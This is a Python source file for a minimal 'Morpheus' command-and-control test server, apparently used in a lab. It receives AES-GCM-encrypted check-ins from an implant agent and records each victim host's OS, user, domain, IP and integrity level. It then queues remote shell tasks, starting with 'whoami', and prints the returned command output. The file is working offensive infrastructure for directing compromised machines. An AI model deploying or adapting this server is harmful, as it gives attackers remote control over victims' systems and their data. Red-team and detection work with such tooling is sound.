#!/usr/bin/env python3
"""
Minimal Morpheus C2 Test Server
Uses a pre-shared AES-256-GCM key for the initial checkin decryption.
"""

import json
import base64
import sys
import uuid
import os as pyos
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

HOST = "0.0.0.0"
PORT = 8080
AES_KEY = None
AGENT_UUID = None
AGENT_INFO = {}
PENDING_TASKS = {}

# Pre-shared key (from test_key.txt or env)
TEST_KEY_FILE = "/workspace/test_key.txt"
if pyos.path.exists(TEST_KEY_FILE):
    with open(TEST_KEY_FILE) as f:
        AES_KEY = base64.b64decode(f.read().strip())
    print(f"[*] Loaded pre-shared key from {TEST_KEY_FILE}")


def decrypt_message(key: bytes, encrypted_b64: str) -> bytes:
    raw = base64.b64decode(encrypted_b64)
    nonce, ciphertext = raw[:12], raw[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)


def encrypt_message(key: bytes, plaintext: bytes) -> str:
    nonce = pyos.urandom(12)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ciphertext).decode()


def handle_checkin(data: dict) -> dict:
    global AES_KEY, AGENT_UUID, AGENT_INFO
    AGENT_UUID = data["uuid"]
    AGENT_INFO = {
        "os": data.get("os", "?"),
        "user": data.get("user", "?"),
        "host": data.get("host", "?"),
        "pid": data.get("pid", "?"),
        "ip": data.get("ip", "?"),
        "arch": data.get("architecture", "?"),
        "domain": data.get("domain", "?"),
        "integrity": data.get("integrity", "?"),
    }
    # If the agent sends a new key in the checkin, use it
    enc_key_b64 = data.get("encryption_key", "")
    if enc_key_b64:
        try:
            AES_KEY = base64.b64decode(enc_key_b64)
        except Exception:
            pass

    print(f"\n[+] CHECKIN from {AGENT_INFO['host']} (UUID: {AGENT_UUID})")
    print(f"    OS: {AGENT_INFO['os']} | User: {AGENT_INFO['user']}")
    print(f"    IP: {AGENT_INFO['ip']} | PID: {AGENT_INFO['pid']} | Arch: {AGENT_INFO['arch']}")
    print(f"    Domain: {AGENT_INFO['domain']} | Integrity: {AGENT_INFO['integrity']}")
    sys.stdout.flush()

    PENDING_TASKS[AGENT_UUID] = [
        {"command": "shell", "uuid": str(uuid.uuid4())[:8],
         "params": json.dumps({"command": "whoami"})},
    ]

    return {"action": "checkin", "uuid": AGENT_UUID, "status": "success"}


def handle_get_tasking(data: dict) -> dict:
    agent_uuid = data.get("uuid", AGENT_UUID)
    if agent_uuid not in PENDING_TASKS:
        PENDING_TASKS[agent_uuid] = []

    tasks = PENDING_TASKS[agent_uuid]
    PENDING_TASKS[agent_uuid] = []

    if tasks:
        print(f"\n[>] Sending {len(tasks)} task(s) to {agent_uuid}:")
        for t in tasks:
            print(f"    -> {t['command']} (task_id: {t['uuid']})")
        sys.stdout.flush()
    else:
        print(f"\n[>] No tasks for {agent_uuid}")
        sys.stdout.flush()

    return {"action": "get_tasking", "uuid": agent_uuid, "tasks": tasks}


def handle_post_response(data: dict) -> dict:
    task_uuid = data.get("task_uuid", "?")
    user_output = data.get("user_output", "")
    status = data.get("status", "?")
    completed = data.get("completed", False)
    print(f"\n[<] RESPONSE task={task_uuid} status={status}:")
    if user_output:
        for line in user_output.strip().split("\n")[:30]:
            print(f"    {line}")
    sys.stdout.flush()
    return {"action": "post_response", "uuid": AGENT_UUID, "status": "success"}


def add_task(command, cmd_params=None):
    if cmd_params is None:
        cmd_params = {}
    if AGENT_UUID and AGENT_UUID in PENDING_TASKS:
        PENDING_TASKS[AGENT_UUID].append({
            "command": command,
            "uuid": str(uuid.uuid4())[:8],
            "params": json.dumps(cmd_params),
        })


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass
        sys.stdout.flush()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        html = "<html><body><h1>Morpheus C2 Server OK</h1>"
        html += f"<p>Agent UUID: {AGENT_UUID or 'N/A'}</p>"
        html += f"<p>AES Key loaded: {'Yes' if AES_KEY else 'No'}</p>"
        html += "<p>Use: <code>curl -X POST http://192.168.122.1:8080/ -d @payload.json</code></p>"
        html += "</body></html>"
        self.wfile.write(html.encode())

    def do_POST(self):
        global AES_KEY, AGENT_UUID
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            envelope = json.loads(body)
        except json.JSONDecodeError:
            self.send_response(400)
            self.end_headers()
            return

        raw_message = envelope.get("message", "")
        agent_uuid = envelope.get("uuid", "")

        try:
            plaintext = decrypt_message(AES_KEY, raw_message)
            inner = json.loads(plaintext)
        except Exception as e:
            print(f"[!] Decrypt failed: {e}")
            self.send_response(400)
            self.end_headers()
            return

        action = inner.get("action", "")
        if action == "checkin":
            response_data = handle_checkin(inner)
        elif action == "get_tasking":
            response_data = handle_get_tasking(inner)
        elif action == "post_response":
            response_data = handle_post_response(inner)
        else:
            response_data = {"status": "error", "error": f"unknown action: {action}"}

        try:
            resp_plain = json.dumps(response_data).encode()
            resp_encrypted = encrypt_message(AES_KEY, resp_plain)
            resp_body = json.dumps({"message": resp_encrypted, "uuid": AGENT_UUID}).encode()
        except Exception as e:
            print(f"[!] Encrypt response failed: {e}")
            self.send_response(500)
            self.end_headers()
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(resp_body)


def run_server():
    server = HTTPServer((HOST, PORT), C2Handler)
    print(f"[*] Morpheus C2 test server listening on http://{HOST}:{PORT}/")
    print(f"[*] Waiting for agent checkin...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


if __name__ == "__main__":
    run_server()
